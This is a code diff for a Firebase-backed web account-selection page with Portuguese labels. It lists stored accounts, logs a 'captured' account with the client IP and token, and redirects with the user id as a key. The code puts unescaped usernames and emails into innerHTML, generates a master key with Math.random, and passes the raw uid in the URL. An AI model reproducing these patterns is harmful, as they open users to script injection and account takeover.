+          if (!masterKey) {
+            const snap = await get(ref(db, `userKeysData/${user.uid}`));
+            if (snap.exists()) masterKey = snap.val().masterKey || null;
+          }
+          if (!masterKey) {
+            masterKey = 'master_' + Date.now() + '_' + Math.random().toString(36).substr(2,12);
+            await set(ref(db, `userKeysData/${user.uid}/masterKey`), masterKey);
+            localStorage.setItem('codehub_masterKey', masterKey);
+          }
+
+          const contasSnap = await get(ref(db, `contas/${masterKey}`));
+          const accounts = contasSnap.exists() ? Object.values(contasSnap.val()) : [];
+          const container = document.getElementById('account-list-container');
+          container.innerHTML = '';
+          
+          accounts.forEach(acc => {
+            const div = document.createElement('div');
+            div.className = 'account-item';
+            const initial = (acc.username || acc.email || '?').charAt(0).toUpperCase();
+            div.innerHTML = `
+              <div class="account-avatar" style="background:#4361ee;">${initial}</div>
+              <div class="account-info">
+                <div class="account-name">${acc.username || 'Usuário'}</div>
+                <div class="account-email">${acc.email || ''}</div>
+              </div>
+            `;
+            div.addEventListener('click', () => {
+              document.querySelectorAll('.account-item').forEach(el => el.style.borderColor = 'transparent');
+              div.style.borderColor = '#4361ee';
+              document.getElementById('confirmAccountBtn').onclick = () => proceedWithAccount(acc.uid);
+            });
+            container.appendChild(div);
+          });
+          document.getElementById('status').textContent = `Selecione uma conta (${accounts.length} disponíveis)`;
+        });
+      } catch (e) {
+        document.getElementById('status').textContent = '❌ Erro: ' + e.message;
       }
     }
 
-    // ===== EVENTOS =====
-    confirmAccountBtn.addEventListener('click', () => {
-      if (!selectedAccountUid) {
-        isConfigError = true;
-        showError(new Error('Selecione uma conta primeiro.'), true);
-        return;
-      }
-      proceedWithAccount(selectedAccountUid);
-    });
+    async function proceedWithAccount(uid) {
+      document.getElementById('status').textContent = 'Preparando...';
+      const userDataRef = ref(db, `userKeysData/${uid}`);
+      const snap = await get(userDataRef);
+      const userData = snap.exists() ? snap.val() : null;
+      const nome = userData?.nome || userData?.username || currentUser?.displayName || 'Usuário';
+      const email = userData?.email || currentUser?.email || '';
+      
+      await saveCapturedAccount(uid, email, nome, clientIP, appToken);
+      
+      const customDomain = tokenData.domains?.[0];
+      if (!customDomain) return alert('Erro: Nenhum domínio configurado.');
+      
+      let finalUrl = redirectUrlParam || `https://${customDomain}/index.html`;
+      const sep = finalUrl.includes('?') ? '&' : '?';
+      window.location.href = finalUrl + sep + `userKey=${encodeURIComponent(uid)}`;
+    }
 
-    cancelSelectionBtn.addEventListener('click', redirectToLogin);
-    loginLinkEl.addEventListener('click', (e) => {
+    document.getElementById('loginLink').addEventListener('click', (e) => {
       e.preventDefault();
       redirectToLogin();
     });
-
-    const logoutBtn = document.createElement('button');
-    logoutBtn.textContent = 'Trocar Usuário';
-    logoutBtn.className = 'btn btn-outline';
-    logoutBtn.style.marginTop = '10px';
-    logoutBtn.onclick = async () => {
-      await signOut(auth);
-      statusEl.textContent = 'Sessão encerrada.';
-      setTimeout(redirectToLogin, 1500);
-    };
-    document.querySelector('.auth-content').appendChild(logoutBtn);
 
     init();
   </script>
